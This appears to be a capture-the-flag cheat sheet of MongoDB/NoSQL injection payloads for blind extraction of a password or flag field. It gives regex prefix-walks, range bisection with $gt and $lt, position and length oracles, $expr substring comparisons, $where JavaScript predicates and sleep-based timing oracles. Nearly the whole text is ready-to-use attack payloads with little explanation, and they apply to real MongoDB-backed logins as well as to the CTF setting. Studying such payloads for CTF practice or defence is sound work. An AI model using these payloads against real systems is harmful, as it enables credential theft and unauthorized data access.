# Extraction deep — the char-by-char details

## The prefix-walk — `^a` → `^ab` → `^abc`

```json
{"pass": {"$regex": "^a"}}     — true?
{"pass": {"$regex": "^b"}}     — false?
{"pass": {"$regex": "^f"}}     — true → next char
{"pass": {"$regex": "^fa"}}    — ...
{"pass": {"$regex": "^fl"}}    — ...
{"pass": {"$regex": "^fla"}}   — ...
{"pass": {"$regex": "^flag"}}  — ...
{"pass": {"$regex": "^flag\\{"}}  — the flag-prefix
```

The prefix-walk — `extraction.md`.

## The char-set — the flag-alphabet

```text
f l a g { } a-z 0-9 _ -
```

The flag-charset — `flag{...}` — the bounded alphabet.

## The binary-search — the range-oracle

```json
{"pass": {"$gt": "m"}}    — is char > 'm'?
{"pass": {"$lt": "m"}}    — is char < 'm'?
{"pass": {"$gte": "a", "$lt": "n"}}
```

The range-oracle — bisect the alphabet — `operators.md`.

## The position-oracle — `^.{N}c`

```json
{"pass": {"$regex": "^.{0}a"}}
{"pass": {"$regex": "^.{1}a"}}
{"pass": {"$regex": "^.{2}a"}}
{"pass": {"$regex": "^.{3}a"}}
{"pass": {"$regex": "^.{4}a"}}
{"pass": {"$regex": "^.{5}a"}}
{"pass": {"$regex": "^.{10}a"}}
{"pass": {"$regex": "^.{19}a"}}
{"pass": {"$regex": "^.{20}a"}}
```

`^.{N}c` — the char at index N is `c` — `extraction.md`.

## The length-oracle — `^.{N}$`

```json
{"pass": {"$regex": "^.{1}$"}}
{"pass": {"$regex": "^.{5}$"}}
{"pass": {"$regex": "^.{10}$"}}
{"pass": {"$regex": "^.{20}$"}}
{"pass": {"$regex": "^.{32}$"}}
{"pass": {"$regex": "^.{40}$"}}
{"pass": {"$regex": "^.{64}$"}}
{"pass": {"$regex": "^.{100}$"}}
{"pass": {"$regex": "^.{1,10}$"}}
{"pass": {"$regex": "^.{20,}$"}}
{"pass": {"$regex": "^.{50,100}$"}}
```

The length-oracle — `extraction.md`.

## The char-class — `^[a-f]` / `^[0-9]`

```json
{"pass": {"$regex": "^[a-f]"}}
{"pass": {"$regex": "^[0-9]"}}
{"pass": {"$regex": "^[a-z0-9]"}}
{"pass": {"$regex": "^[A-Za-z0-9]"}}
{"pass": {"$regex": "^[a-z0-9_-]"}}
{"pass": {"$regex": "^\\w"}}
{"pass": {"$regex": "^\\d"}}
{"pass": {"$regex": "^\\S"}}
{"pass": {"$regex": "^[^0-9]"}}
{"pass": {"$regex": "^[^a-z]"}}
```

The char-class — the "is it hex/alpha/numeric" oracle — `extraction.md`.

## The `$expr` — the aggregation-operators

```json
{"$expr": {"$eq": [{"$substr": ["$pass", 0, 1]}, "f"]}}
{"$expr": {"$eq": [{"$substr": ["$pass", 0, 2]}, "fl"]}}
{"$expr": {"$eq": [{"$substr": ["$pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$strLenCP": "$pass"}, 20]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$pass", "{"]}, 4]}}
{"$expr": {"$eq": [{"$indexOfBytes": ["$pass", "{"]}, 4]}}
{"$expr": {"$eq": [{"$toUpper": "$pass"}, "FLAG{X}"]}}
{"$expr": {"$eq": [{"$toLower": "$pass"}, "flag{x}"]}}
{"$expr": {"$eq": [{"$strcasecmp": ["$pass", "flag{x}"]}, 0]}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^flag\\{"}}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "flag"}}}
```

`$expr` — `aggregation.md` / `operators-js.md`.

## The `$where` — the JS-predicates

```json
{"user": {"$where": "this.pass[0] == 'f'"}}
{"user": {"$where": "this.pass[0] == 'f' && this.pass[1] == 'l'"}}
{"user": {"$where": "this.pass.substr(0, 4) == 'flag'"}}
{"user": {"$where": "this.pass.startsWith('flag')"}}
{"user": {"$where": "this.pass.charCodeAt(0) == 102"}}
{"user": {"$where": "this.pass.charCodeAt(0) > 100"}}
{"user": {"$where": "this.pass.length == 20"}}
{"user": {"$where": "this.pass.indexOf('{') == 4"}}
{"user": {"$where": "this.pass.endsWith('}')"}}
{"user": {"$where": "sleep(3000) || this.pass[0] == 'f'"}}
```

`operators-js.md`.

## The `$where` timing — the sleep-oracle

```json
{"user": {"$where": "this.pass[0] == 'f' ? sleep(3000) : true"}}
{"user": {"$where": "this.pass[0] == 'f' && sleep(3000)"}}
{"user": {"$where": "if (this.pass[0] == 'f') sleep(3000); true"}}
{"user": {"$where": "this.pass[0] != 'f' || sleep(3000)"}}
```

The timing-oracle — `operators-js.md`.

## The `_id` — the ObjectId extraction

```json
{"_id": {"$regex": "^a"}}
{"_id": {"$regex": "^ab"}}
{"_id": {"$regex": "^[a-f0-9]"}}
{"_id": {"$gt": {"$oid": "500000000000000000000000"}}}
{"_id": {"$lt": {"$oid": "700000000000000000000000"}}}
{"_id": {"$gte": {"$oid": "600000000000000000000000"}, "$lt": {"$oid": "680000000000000000000000"}}}
```

The ObjectId — the hex-string `$regex` — `mongo-specific.md`.

## The `flag`-field — the flag-walk

```json
{"flag": {"$regex": "^flag\\{"}}
{"flag": {"$regex": "^flag\\{a"}}
{"flag": {"$regex": "^flag\\{[a-z0-9_]+\\}$"}}
{"flag": {"$regex": "^flag\\{[a-z0-9_]{20}\\}$"}}
{"flag": {"$exists": true}}
{"flag": {"$type": "string"}}
{"flag": {"$ne": null}}
{"$expr": {"$eq": [{"$substrCP": ["$flag", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$flag", 4, 1]}, "{"]}}
{"$expr": {"$eq": [{"$strLenCP": "$flag"}, 32]}}
```

The flag-field — `flag-extraction.md`.
